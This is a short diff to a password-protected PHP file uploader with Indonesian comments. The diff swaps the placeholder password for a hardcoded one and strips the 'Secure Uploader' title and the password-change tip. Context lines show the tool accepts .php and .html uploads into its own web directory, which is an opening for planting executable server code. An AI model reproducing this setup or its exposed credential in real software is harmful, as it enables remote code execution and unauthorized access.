@@ -7,7 +7,7 @@
  *************************************************/
 
 // ====== CONFIG ======
-$PASSWORD = 'ganti_password_ini';            // ganti!
+$PASSWORD = 'm1nHh4o@';            // ganti!
 $MAX_BYTES = 200 * 1024 * 1024;              // 200 MB per file
 $ALLOWED_EXT = ['zip','txt','csv','json','png','jpg','jpeg','gif','webp','mp4','mp3','pdf','html','css','js','php']; // atur sesuai kebutuhan
 $UPLOAD_DIR = __DIR__;                       // target folder: sama dengan uploader.php
@@ -157,11 +157,11 @@ button{padding:10px 14px;border:0;border-radius:8px;background:#3b82f6;color:#ff
 </head>
 <body>
   <div class="box">
-    <h1>Secure Uploader — Login</h1>
+    <h1>Login</h1>
     $errHtml
     <form method="post">
       <input type="password" name="pass" placeholder="Password" required />
-      <div class="small">Tips: ganti password di bagian CONFIG file.</div>
+      <div class="small"></div>
       <div style="margin-top:12px"><button type="submit">Masuk</button></div>
     </form>
   </div>
